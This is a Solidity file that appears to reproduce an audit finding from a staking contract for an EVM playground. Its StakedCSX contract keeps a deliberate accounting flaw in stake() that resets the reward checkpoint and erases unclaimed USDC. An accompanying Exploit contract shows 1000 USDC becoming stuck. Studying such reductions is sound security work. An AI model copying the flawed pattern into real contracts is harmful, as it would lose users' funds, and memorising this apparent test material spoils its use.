// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  CSX — H-01 (Shieldify, AuditVault 44005)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: stake() calls _updateRewardRate, which sets the caller's
    checkpoint to lastRewardRate, and it does not first save the unclaimed
    reward into credit. A second stake wipes the pending USDC.
    Blamed calls copied verbatim (@> VULN). */

contract Erc20 {
    string public name;
    string public symbol;
    uint8 public decimals;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
        decimals = 18;
    }

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract StakedCSX {
    uint256 private constant _DIVISION = 10 ** 33;

    Erc20 public immutable TOKEN_CSX;
    Erc20 public immutable TOKEN_WETH;
    Erc20 public immutable TOKEN_USDC;
    Erc20 public immutable TOKEN_USDT;

    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;
    mapping(address => uint256) public lastRewardRate;
    mapping(address => mapping(address => uint256)) public rewardRate;
    mapping(address => mapping(address => uint256)) public credit;
    mapping(address => uint256) public nonDistributedRewardsPerToken;

    error AmountMustBeGreaterThanZero();

    constructor(Erc20 csx, Erc20 weth, Erc20 usdc, Erc20 usdt) {
        TOKEN_CSX = csx;
        TOKEN_WETH = weth;
        TOKEN_USDC = usdc;
        TOKEN_USDT = usdt;
    }

    function stake(uint256 _amount) external {
        if (_amount == 0) {
            revert AmountMustBeGreaterThanZero();
        }
        _updateRewardRate(msg.sender, address(TOKEN_WETH));
        // @> VULN: moves the USDC checkpoint to lastRewardRate and drops the unclaimed reward
        _updateRewardRate(msg.sender, address(TOKEN_USDC));
        _updateRewardRate(msg.sender, address(TOKEN_USDT));
        _mint(msg.sender, _amount);
        TOKEN_CSX.transferFrom(msg.sender, address(this), _amount);
    }

    function depositDividend(address _token, uint256 _reward) external {
        if (_reward == 0) revert AmountMustBeGreaterThanZero();
        TOKEN_USDC.transferFrom(msg.sender, address(this), _reward);
        nonDistributedRewardsPerToken[_token] += _reward;
    }

    function distribute(bool, bool dUsdc, bool) external {
        uint256 rewardUSDC = nonDistributedRewardsPerToken[address(TOKEN_USDC)];
        if (rewardUSDC > 0) {
            if (dUsdc) {
                nonDistributedRewardsPerToken[address(TOKEN_USDC)] = 0;
                lastRewardRate[address(TOKEN_USDC)] += ((rewardUSDC * _DIVISION) / totalSupply);
            }
        }
    }

    function rewardOf(address _account) public view returns (uint256 usdcAmount, uint256 usdtAmount, uint256 wethAmount) {
        uint256 deposited = balanceOf[_account];
        if (deposited != 0) {
            usdcAmount = (deposited * (lastRewardRate[address(TOKEN_USDC)] - rewardRate[address(TOKEN_USDC)][_account])) / _DIVISION;
        }
        if (credit[address(TOKEN_USDC)][_account] > 0) {
            usdcAmount += credit[address(TOKEN_USDC)][_account];
        }
    }

    function claim() external returns (uint256 usdcAmount) {
        (usdcAmount,,) = rewardOf(msg.sender);
        if (usdcAmount > 0) {
            credit[address(TOKEN_USDC)][msg.sender] = 0;
            _updateRewardRate(msg.sender, address(TOKEN_USDC));
            TOKEN_USDC.transfer(msg.sender, usdcAmount);
        }
    }

    function _updateRewardRate(address _to, address _token) private {
        rewardRate[_token][_to] = lastRewardRate[_token];
    }

    function _mint(address to, uint256 amount) private {
        totalSupply += amount;
        balanceOf[to] += amount;
    }
}

contract Exploit {
    uint256 public constant STAKE = 100e18;
    uint256 public constant REWARD = 1000e18;

    Erc20 public csx; // CREATE nonce 1
    Erc20 public weth; // CREATE nonce 2
    Erc20 public usdc; // CREATE nonce 3
    Erc20 public usdt; // CREATE nonce 4
    StakedCSX public staking; // CREATE nonce 5

    uint256 public owedBefore;
    uint256 public owedAfter;
    uint256 public claimed;
    uint256 public stuck;

    constructor() {
        csx = new Erc20("CSX", "CSX");
        weth = new Erc20("Wrapped Ether", "WETH");
        usdc = new Erc20("USD Coin", "USDC");
        usdt = new Erc20("Tether", "USDT");
        staking = new StakedCSX(csx, weth, usdc, usdt);
        csx.mint(address(this), STAKE + 1);
        csx.approve(address(staking), type(uint256).max);
        usdc.mint(address(this), REWARD);
        staking.stake(STAKE);
    }

    function run() external {
        usdc.approve(address(staking), REWARD);
        staking.depositDividend(address(usdc), REWARD);
        staking.distribute(false, true, false);

        (owedBefore,,) = staking.rewardOf(address(this));
        require(owedBefore == REWARD, "owed 1000 before the second stake");

        staking.stake(1);

        (owedAfter,,) = staking.rewardOf(address(this));
        require(owedAfter == 0, "second stake wiped the reward");

        claimed = staking.claim();
        require(claimed == 0, "claim paid 0");

        stuck = usdc.balanceOf(address(staking));
        require(stuck == REWARD, "1000 USDC stuck in StakedCSX");
        require(usdc.balanceOf(address(this)) == 0, "user received 0");
    }
}
